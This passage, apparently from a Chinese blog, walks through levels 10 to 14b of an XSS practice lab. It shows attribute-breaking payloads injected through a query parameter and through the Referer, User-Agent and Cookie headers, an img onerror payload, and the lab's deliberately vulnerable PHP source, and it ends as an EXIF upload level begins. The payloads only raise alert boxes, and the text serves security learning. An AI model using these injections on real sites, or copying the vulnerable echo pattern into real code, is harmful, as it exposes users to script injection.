<p>分析： onclick&#x3D;’alert(‘123’)’<br>1.浏览器将 前两个单引号看作一组即’alert(‘   –&gt;转为双赢号，即”alert(“    （标签属性后面浏览器都会单引号转为双引号）<br>2.对于剩下的 ‘)’  ，不是任何属性的值，不将单引号转为双引号，被当作属性或标签呈现蓝色</p>
</blockquote>
<ul>
<li>经验总结：使用多个相同的引号要注意浏览的识别规则</li>
</ul>
<p>补充：自动点击测试</p>
<p>输入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort=&quot; onfocus=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text &#x27; autofocus&quot;    </span><br><span class="line">autofocus是独立属性</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_42.png" class="" title="在这里插入图片描述">
<p>没有自动点击（）原因是尾部存在双引号–&gt;语法错误</p>
<p>测试：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort=&quot; onfocus=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text&#x27;  autofocus //</span><br><span class="line">实为：<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onfocus</span>=<span class="string">&#x27;alert(123)&#x27;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&amp;t_sort=&quot; onfocus=&#x27;alert(&quot;123&quot;)&#x27; autofocus type=&#x27;text&#x27; </span><br><span class="line">实为：<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onfocus</span>=<span class="string">&#x27;alert(123)&#x27;</span> <span class="attr">autofocus</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>实现自动点击</p>
<p>因此，注入的语句最后在尾部加注释（具体情况具体分析）</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level11.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level10&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];  <span class="comment">// 接受t_sort的参数 </span></span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;   </span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>类型：url类型</p>
<p>解题思路：</p>
<p>没有输入任何语句，检查页面：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_43.png" class="" title="在这里插入图片描述">


<ul>
<li>包含多个隐藏标签</li>
<li>其中一个input标签存在值，是上一关注入的payload</li>
</ul>
<p>删除level11关页面后，用目录页面访问level11关，回显结果为：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_44.png" class="" title="在这里插入图片描述">

<ul>
<li>分析得出，t_ref的值记录的是从个网址访问的</li>
<li>可以推断出，后端将数据包中referer栏的地址拼接到value</li>
</ul>
<h3 id="Referer"><a href="#Referer" class="headerlink" title="*Referer"></a>*Referer</h3><p>刷新页面，抓取数据包：修改数据包中的Referer，即可完成payload注入</p>
<p>修改为：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text&#x27; //</span><br></pre></td></tr></table></figure>

<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_45.png" class="" title="在这里插入图片描述">
<p>页面渲染：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_46.png" class="" title="在这里插入图片描述">
<p>点击即可通关</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level12.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level11&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]; <span class="comment">//获取Referer </span></span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);  <span class="comment">//这里进行替换，可以选择插入属性</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>类型： url类型</p>
<p>与11关类似，不再过多演示</p>
<h3 id="HTTP-USER-AGENT"><a href="#HTTP-USER-AGENT" class="headerlink" title="*HTTP_USER_AGENT"></a>*HTTP_USER_AGENT</h3><img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_47.png" class="" title="在这里插入图片描述">
<p>修改为：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text&#x27; //  </span><br><span class="line">上述语句失败-拼接value前双引号被实例化转义</span><br><span class="line">继续修改：</span><br><span class="line">&quot; onclick=alert(&#x27;123&#x27;) type=&#x27;text&#x27; //  </span><br><span class="line">成功绕过   </span><br><span class="line">细节：防止识别错误，除去alert两侧的单引号</span><br></pre></td></tr></table></figure>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level13.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level12&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];  <span class="comment">//获取代理信息</span></span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>; </span><br><span class="line"><span class="comment">//转义后再拼接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>类型：隐藏标签</p>
<p>解题思路：</p>
<p>探测：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=1&amp;t_link=2&amp;t_history=3&amp;t_sort=4&amp;t_cook=5</span><br></pre></td></tr></table></figure>
<p>回显：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_48.png" class="" title="在这里插入图片描述">
<p>测试t_sort</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort=&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text&#x27; //</span><br></pre></td></tr></table></figure>
<p>回显：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_49.png" class="" title="在这里插入图片描述">

<ul>
<li>双引号被实例化转义</li>
</ul>
<p>其余测试payload也失败</p>
<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="*Cookie"></a>*Cookie</h3><p>抓取数据包修改cookie栏：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert(&#x27;123&#x27;) type=&#x27;text&#x27; //</span><br></pre></td></tr></table></figure>

<p>点击文本框成功通关</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level14.php&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level13&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;call me maybe?&quot;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];  <span class="comment">//获取cookie</span></span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level14a"><a href="#level14a" class="headerlink" title="level14a"></a>level14a</h2><p>类型：</p>
<p>解题思路;</p>
<h3 id="PHP解析执行机制"><a href="#PHP解析执行机制" class="headerlink" title="*PHP解析执行机制"></a>*PHP解析执行机制</h3><blockquote>
<p>PHP 解析机制：PHP 文件本质上是服务器端脚本文件，当服务器接收到对 PHP 文件的请求时，会先对其中的 PHP 代码进行解析和执行。 如果文件里有 HTML、CSS、JavaScript 代码，PHP 解析器会直接将这些非 PHP 代码原样输出给客户端。</p>
</blockquote>
<p>输入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);&lt;/scritp&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_50.png" class="" title="在这里插入图片描述">
<p>script 别td 包含，无法执行js代码</p>
<p>输入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;123&#x27;)&quot;</span>&gt;</span>      //页面加载触发</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;123&#x27;)&quot;</span>&gt;</span>  //数标悬停触发</span><br></pre></td></tr></table></figure>
<p>渲染：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_51.png" class="" title="在这里插入图片描述">


<p>通关成功</p>
<p>源码分析：</p>
<hr>
<h2 id="level14b"><a href="#level14b" class="headerlink" title="level14b"></a>level14b</h2><p>类型：文件上传</p>
<p>解题思路：</p>
<h3 id="EXIF"><a href="#EXIF" class="headerlink" title="*EXIF"></a>*EXIF</h3><blockquote>
<p>图片的 EXIF（Exchangeable Image File Format） 是嵌入在图片文件中的一组元数据（Metadata），记录了拍摄设备、拍摄参数、时间、地理位置等信息。它是数码照片的“数字身份证”，广泛应用于摄影、取证和图片管理<br>EXIF 包含的信息：</p>
<blockquote>
<p>1.基础信息:</p>
<blockquote>
<p>拍摄时间、日期<br>文件格式（如 JPEG、RAW）<br>文件大小和分辨率</p>
<blockquote>
<p>2.设备参数</p>
<blockquote>
<p>相机品牌和型号（如 Canon EOS 5D Mark IV）<br>镜头型号<br>序列号（部分设备）</p>
<blockquote>
<p>3.拍摄参数</p>
<blockquote>
<p>光圈值（F值）<br>快门速度<br>ISO 感光度<br>焦距（如 50mm）<br>白平衡模式<br>曝光补偿</p>
<blockquote>
<p>4.地理位置</p>
<blockquote>
<p>GPS 坐标（需设备开启定位功能）<br>海拔高度（部分设备支持）</p>
<blockquote>
<p>4.其他信息</p>
<blockquote>
<p>版权声明（作者信息）<br>缩略图预览<br>后期编辑软件（如 Photoshop 修改记录）</p>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
<blockquote>
<p>EXIF 的作用与用途<br>1.摄影学习<br>2.分析他人作品的拍摄参数（如光圈、快门），提升摄影技巧。<br>3.图片管理<br>4.按时间、设备分类整理照片。<br>5.版权保护<br>6.通过 EXIF 中的作者信息证明图片归属。<br>地理位置记录<br>7.旅行摄影时标记拍摄地点。<br>8.取证调查<br>9.验证图片真实性（如时间、设备是否匹配）。</p>
</blockquote>
<blockquote>
<p>问题与解决：<br>1.敏感信息泄露<br>GPS 坐标可能暴露家庭住址或常去地点。<br>2.清除 EXIF</p>
<blockquote>
<p>分享图片前，使用工具删除 EXIF（如 Exif Purge）。</p>
</blockquote>
<p>3.平台自动删除</p>
<blockquote>
<p>微信、微博等社交平台上传图片时会默认清除 EXIF。</p>
</blockquote>
</blockquote>
<p>随便上传正常的照片：</p>
